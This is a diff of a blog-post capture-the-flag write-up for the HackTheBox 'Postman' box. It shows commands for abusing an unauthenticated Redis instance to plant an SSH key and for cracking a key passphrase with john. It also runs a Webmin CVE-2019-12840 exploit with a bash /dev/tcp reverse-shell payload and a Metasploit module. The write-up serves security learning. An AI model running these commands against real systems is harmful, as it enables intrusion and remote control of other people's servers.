@@ -6,7 +6,7 @@
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Postman was an &amp;ldquo;easy&amp;rdquo; rated box quite quick to solve. It can be really interesting if you want to try to play with the now widely used Redis.
+<meta name="description" content="Postman was an &amp;ldquo;easy&amp;rdquo; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.
 Tl;Dr: The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from redis user to Matt user."/>
 <meta name="keywords" content="hackthebox, ctf, postman, gobuster, webmin, redis, cve-2019-12840, ssh, john"/>
 <meta name="robots" content="noodp"/>
@@ -32,12 +32,22 @@ Tl;Dr: The user flag consisted in exploiting a redis instance accessible without
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Postman - HackTheBox"/>
-<meta name="twitter:description" content="Postman was an &#34;easy&#34; rated box quite quick to solve. It can be really interesting if you want to try to play with the now widely used Redis. The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from `redis` user to `Matt` user. Using the same password we could login to a Webmin panel and use an exploit to run command as root to grab the flag."/>
+<meta name="twitter:description" content="Postman was an &#34;easy&#34; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.
+
+**Tl;Dr:** The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from `redis` user to `Matt` user.  
+Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.
+
+Alright, let&#39;s get into it!"/>
 
 
 
 <meta property="og:title" content="Postman - HackTheBox" />
-<meta property="og:description" content="Postman was an &#34;easy&#34; rated box quite quick to solve. It can be really interesting if you want to try to play with the now widely used Redis. The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from `redis` user to `Matt` user. Using the same password we could login to a Webmin panel and use an exploit to run command as root to grab the flag." />
+<meta property="og:description" content="Postman was an &#34;easy&#34; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.
+
+**Tl;Dr:** The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from `redis` user to `Matt` user.  
+Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.
+
+Alright, let&#39;s get into it!" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/postman/" />
 <meta property="article:published_time" content="2020-03-14T00:00:00+00:00" />
@@ -149,7 +159,7 @@ Tl;Dr: The user flag consisted in exploiting a redis instance accessible without
 
       <span class="post-author">— Written by hg8</span>
       
-        <span class="post-read-time">— 10 min read</span>
+        <span class="post-read-time">— 11 min read</span>
       
     </div>
 
@@ -184,9 +194,9 @@ Tl;Dr: The user flag consisted in exploiting a redis instance accessible without
     
 
     <div class="post-content">
-      <p>Postman was an &ldquo;easy&rdquo; rated box quite quick to solve. It can be really interesting if you want to try to play with the now widely used Redis.</p>
+      <p>Postman was an &ldquo;easy&rdquo; rated box. It was quite quick but nice to solve. It can be really interesting if you want to learn and play with the now widely used Redis.</p>
 <p><strong>Tl;Dr:</strong> The user flag consisted in exploiting a redis instance accessible without authentication. From this instance you would bruteforce the passphrase of a SSH key found in a backup folder and use its password to pivot from <code>redis</code> user to <code>Matt</code> user.<br>
-Using the same password we could login to a Webmin panel and use an exploit to run command as root to grab the flag.</p>
+Using the same password we could login to a Webmin panel and use an exploit (CVE-2019-12840) to achieve remote commands execution as root and grab the flag.</p>
 <p>Alright, let&rsquo;s get into it!</p>
 <hr>
 <p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
@@ -194,7 +204,7 @@ Using the same password we could login to a Webmin panel and use an exploit to r
 </code></pre></div><p>and let&rsquo;s start!</p>
 <h2 id="user-flag">User flag</h2>
 <h3 id="recon">Recon</h3>
-<p>Let&rsquo;s start with the classic nmap scan:</p>
+<p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC postman.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-12-22 20:34 CET
 Nmap scan report <span style="color:#66d9ef">for</span> postman.htb <span style="color:#f92672">(</span>10.10.10.160<span style="color:#f92672">)</span>
@@ -206,13 +216,15 @@ PORT      STATE SERVICE  VERSION
 |_ssl-cert: Subject: commonName<span style="color:#f92672">=</span>*/organizationName<span style="color:#f92672">=</span>Webmin Webserver on Postman
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 46.41 seconds
-</code></pre></div><p>We have a classical web app running on port 80 and the ssh port 22 open. We also have a Webmin server running on port 10000.</p>
+</code></pre></div><p>We have the &ldquo;classic&rdquo;: A web app running on port 80 and the SSH port 22 open. We also have a Webmin server running on port 10000.</p>
 <p>Opening <code>http://postman.htb</code> display the following website:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/71326943-07d84e00-2502-11ea-904d-67647430f4dc.png" alt="postman website"></p>
 <p>While <code>https://postman.htb:10000/</code> display the classical Webmin login page:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/71326975-af558080-2502-11ea-9618-f52af748ddf7.png" alt="postman webmin"></p>
-<p>Starting from there&hellip;.well&hellip; There isn&rsquo;t anything interesting. Something look missing.</p>
-<p>Let&rsquo;s re-run <code>nmap</code>, but this time on the top 10,000 ports:</p>
+<p>Starting from there&hellip;.well&hellip; There isn&rsquo;t anything interesting. I run into a lot of rabbit holes without being able to find anything.</p>
+<p>In particularly I tried running exploits against the Webmin instance including the infamous <a href="https://twitter.com/_hg8_/status/1162694712177954819">CVE-2019-15107 - Remote Code Execution via Password Reset function</a>. But I couldn&rsquo;t get anything to work nor making progress any progress.</p>
+<p>A piece of the puzzle looked missing to me. When this happen I like to restart my recon process from the beginning, to make sure I didn&rsquo;t forgot anything.</p>
+<p>Let&rsquo;s start by re-running <code>nmap</code>, but this time on the top 10,000 ports:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC --top-ports <span style="color:#ae81ff">10000</span> postman.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-12-22 20:39 CET
 Nmap scan report <span style="color:#66d9ef">for</span> postman.htb <span style="color:#f92672">(</span>10.10.10.160<span style="color:#f92672">)</span>
@@ -227,11 +239,11 @@ PORT      STATE SERVICE VERSION
 </span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; Charset<span style="color:#f92672">=</span>iso-8859-1<span style="color:#f92672">)</span>.
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 150.41 seconds
-</code></pre></div><p>A new service appeared. A redis instance running on port 6379. That&rsquo;s probably the missing piece.</p>
-<p>Being new to redis I spent a bit of time reading article and documentation on redis before starting anything.<br>
-During my research I stumbled upon this very interesting article: <a href="http://antirez.com/news/96">A few things about Redis security</a>.</p>
-<p>The article, written by one of the redis dev explain how to &ldquo;crack Redis for fun and no profit&rdquo; on exposed redis instance with no authentication activated.</p>
-<p>First, let&rsquo;s check if the redis instance need authentication:</p>
+</code></pre></div><p>Aah that&rsquo;s interesting! A new service appeared. A redis instance running on port 6379. That&rsquo;s probably the missing piece of our puzzle.</p>
+<p>Being new to redis I spent a bit of time reading articles and documentations on redis before starting anything.<br>
+During my research I stumbled upon this very interesting article: <a href="http://antirez.com/news/96">&ldquo;A few things about Redis security&rdquo;</a>.</p>
+<p>The article, written by one of the redis dev, explain how to &ldquo;<em>crack Redis for fun and no profit</em>&rdquo; on exposed redis instance with no authentication activated.</p>
+<p>Maybe it&rsquo;s our case ? First, let&rsquo;s check if the redis instance need authentication:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ telnet postman.htb <span style="color:#ae81ff">6379</span>
 Trying 10.10.10.160...
 Connected to postman.htb.
@@ -242,9 +254,9 @@ Hey no AUTH required!
 quit
 +OK
 Connection closed by foreign host.
-</code></pre></div><p>Well, indeed not auth is needed to access this redis instance. Let&rsquo;s follow the article to see if we can exploit it the same way the author did.</p>
-<p>The next step described by the author is to write into <code>~/ssh/authorized_keys</code> in order to gain access to the server.</p>
-<p>First step is to generate a ssh key pair we will add to the <code>authorized_keys</code> of the server:</p>
+</code></pre></div><p>Well, indeed not auth is needed to access this redis instance, that&rsquo;s good news. Let&rsquo;s follow the article to see if we can exploit it the same way the author present in his article.</p>
+<p>The next step described in the article is to write our own SSH Public key into <code>~/ssh/authorized_keys</code> in order to gain access to the server.</p>
+<p>First step is to generate a ssh key pair that we will add to the <code>authorized_keys</code> of the server:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh-keygen -t rsa -C <span style="color:#e6db74">&#34;hg8@hg8.hg8&#34;</span>
 Generating public/private rsa key pair.
 Enter file in which to save the key <span style="color:#f92672">(</span>/home/hg8/.ssh/id_rsa<span style="color:#f92672">)</span>: ./id_rsa
@@ -266,7 +278,7 @@ The key<span style="color:#960050;background-color:#1e0010">&#39;</span>s random
 |                 |
 |                 |
 +-----------------+
-</code></pre></div><p>I quote the author on this part since he explain way better than me:</p>
+</code></pre></div><p>I quote the author on this part since he explains way better than me:</p>
 <blockquote>
 <p>Now I’ve a key. My goal is to put it into the Redis server memory, and later to transfer it into a file, in a way that the resulting authorized_keys file is still a valid one. Using the RDB format to do this has the problem that the output will be binary and may in theory also compress strings. But well, maybe this is not a problem. To start let’s pad the public SSH key I generated with newlines before and after the content:</p>
 </blockquote>
@@ -274,7 +286,7 @@ The key<span style="color:#960050;background-color:#1e0010">&#39;</span>s random
 </code></pre></div><p>Now that we have all the pieces, let&rsquo;s add our ssh key to the <code>authorized_keys</code> file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ redis-cli -h 10.10.10.160 echo flushall
 <span style="color:#e6db74">&#34;flushall&#34;</span>
-<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat id_rsa_htb.pub | redis-cli -h 10.10.10.160 -x set crackit
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat id_rsa_with_nl.pub | redis-cli -h 10.10.10.160 -x set crackit
 OK
 <span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh
 OK
@@ -297,7 +309,7 @@ Welcome to Ubuntu 18.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15
 Last login: Mon Aug <span style="color:#ae81ff">26</span> 03:04:25 <span style="color:#ae81ff">2019</span> from 10.10.10.1
 redis@Postman:~$
 </code></pre></div><h3 id="pivot-redis---matt">Pivot Redis -&gt; Matt</h3>
-<p>Ok, now we have a basic access to the machine with Redis user, let&rsquo;s now find the user to pivot to :</p>
+<p>Ok, now we have access to the machine with <code>redis</code> user, let&rsquo;s now find the user to pivot to :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:~$ ls -l /home/Matt/
 total <span style="color:#ae81ff">4</span>
 -rw-rw---- <span style="color:#ae81ff">1</span> Matt Matt <span style="color:#ae81ff">33</span> Aug <span style="color:#ae81ff">26</span> 03:07 user.txt
@@ -334,14 +346,14 @@ npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
 VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
 X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw<span style="color:#f92672">==</span>
 -----END RSA PRIVATE KEY-----
-</code></pre></div><p>Let&rsquo;s pull this key to work on it offline:</p>
+</code></pre></div><p>A private RSA key, we can probably use it to connect to <code>matt</code> account using SSH&hellip; Let&rsquo;s pull this key to work on it offline:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ scp -i id_rsa redis@postman.htb:/opt/id_rsa.bak .
 id_rsa.bak  100% <span style="color:#ae81ff">1743</span>    48.1KB/s   00:00
-</code></pre></div><p>First thing that come to mind is to try to login to <code>Matt</code> account with the key:</p>
+</code></pre></div><p>First thing to try login through SSH on <code>Matt</code>'s&rsquo; account with this key:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">600</span> id_rsa.bak
 <span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa.bak Matt@postman.htb
 Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa.bak&#39;</span>:
-</code></pre></div><p>Of course a passphare is needed. Maybe we can bruteforce it. Calling <code>john</code> to the rescue:</p>
+</code></pre></div><p>Of course a passphare is needed. Maybe we can bruteforce it? Calling <code>john</code> to the rescue:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh2john id_rsa.bak &gt; id_rsa.hash
 
 <span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ john --wordlist<span style="color:#f92672">=</span>~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash
@@ -355,13 +367,14 @@ Session completed
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh -i id_rsa.bak Matt@postman.htb
 Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa.bak&#39;</span>:
 Connection closed by 10.10.10.160 port <span style="color:#ae81ff">22</span>
-</code></pre></div><p><code>Connection closed</code> immediately&hellip; Seems like we have the right ssh key, the right passphare but the ssh config forbid <code>Matt</code> to connect.</p>
+</code></pre></div><p>We immediately get a<code>Connection closed</code> error message upon connexion&hellip; Seems like we have the right ssh key, the right passphare but the ssh config forbid <code>Matt</code> to connect.</p>
 <p>Let&rsquo;s confirm those doubts:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:~$ cat /etc/ssh/sshd_config
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 <span style="color:#75715e">#deny users</span>
 DenyUsers Matt
-</code></pre></div><p>If <code>Matt</code> reuse password we should be able switch to <code>Matt</code> from <code>Redis</code> using <code>su</code>&hellip;</p>
+</code></pre></div><p>Alright so <code>Matt</code> is not allowed to SSH, we need to find another way to access his account.</p>
+<p>If <code>Matt</code> reuse password we should be able switch to <code>Matt</code> from <code>Redis</code> user using <code>su</code>&hellip;</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis@Postman:~$ su - Matt
 Password:
 Matt@Postman:~$ cat user.txt
@@ -369,12 +382,13 @@ Matt@Postman:~$ cat user.txt
 </code></pre></div><h2 id="root-flag">Root Flag</h2>
 <h3 id="recon-1">Recon</h3>
 <p>Now that we have access to our user, let&rsquo;s make a bit of recon to see if we can escalate our privileges to root.</p>
-<p>After a while we can not find anything worthy. Looking back at the user flag we can see that <code>Matt</code> reused his password. Maybe <code>Matt</code> have an account on the Webmin instance we found at the beginning with the same credentials (<code>Matt</code>:<code>computer2008</code>) ?</p>
+<p>After a while we can not find anything worthy onto <code>Matt</code> account. Once again, when being stuck let&rsquo;s go back at beginning to make sure we don&rsquo;t forget anything. Remember that Webmin instance ? It must be there for a reason&hellip;</p>
+<p>Knowing that <code>Matt</code> reuse his password maybe we can be able to connect to Webmin using the same credentials (<code>Matt</code>:<code>computer2008</code>) ?</p>
 <p>Let&rsquo;s try to login:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/71327015-402c5c00-2503-11ea-871c-0a5321984f47.png" alt="postman webmin login"></p>
-<p><code>We are in...</code></p>
-<p>From this panel we can not access a lot&hellip; Only the <code>Software Package Updates</code> page. We can not seem to do anything interesting from there.</p>
-<p>Knowing the Webmin version is <code>1.910</code>, let&rsquo;s see if some exploit have been published:</p>
+<p>Success! <code>We are in...</code></p>
+<p>From this control panel we can not access a lot&hellip; Only the <code>Software Package Updates</code> page. We can not seem to do anything interesting from there.</p>
+<p>Knowing from the <code>nmap</code> result and the page footer, the Webmin version is <code>1.910</code>, let&rsquo;s see if some exploit have been published:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ searchsploit webmin
 ----------------------------------------------------------- ----------------------------------------
  Exploit Title                                             |  Path
@@ -405,15 +419,11 @@ webmin 0.91 - Directory Traversal                          | exploits/cgi/remote
 <p>First, let&rsquo;s open our netcat listener:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
-</code></pre></div><p>And let&rsquo;s launch the exploit (after reading the source code, no modification seems needed to make it work properly):</p>
+</code></pre></div><p>And let&rsquo;s launch the exploit (after reading the source code, no modification seems needed to make it work properly on this box):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ git clone https://github.com/bkaraceylan/CVE-2019-12840_POC.git
 Cloning into <span style="color:#e6db74">&#39;CVE-2019-12840_POC&#39;</span>...
-remote: Enumerating objects: 10, <span style="color:#66d9ef">done</span>.
-remote: Counting objects: 100% <span style="color:#f92672">(</span>10/10<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
-remote: Compressing objects: 100% <span style="color:#f92672">(</span>8/8<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
-remote: Total <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>delta 2<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>delta 1<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span>
 Unpacking objects: 100% <span style="color:#f92672">(</span>10/10<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
-hugo@archpen:/home/hugo/exploit/webmin <span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cd CVE-2019-12840_POC
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cd CVE-2019-12840_POC
 <span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python exploit.py -u https://postman.htb -p <span style="color:#ae81ff">10000</span> -U Matt -P computer2008 -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&#34;</span>
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to login...
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting...
@@ -459,8 +469,8 @@ Exploit target:
    Id  Name
    --  ----
    <span style="color:#ae81ff">0</span>   Webmin &lt;<span style="color:#f92672">=</span> 1.910
-   
-   
+
+
 msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.160
 RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.160
 msf5 exploit<span style="color:#f92672">(</span>linux/http/webmin_packageup_rce<span style="color:#f92672">)</span> &gt; set LHOST 10.10.10.10
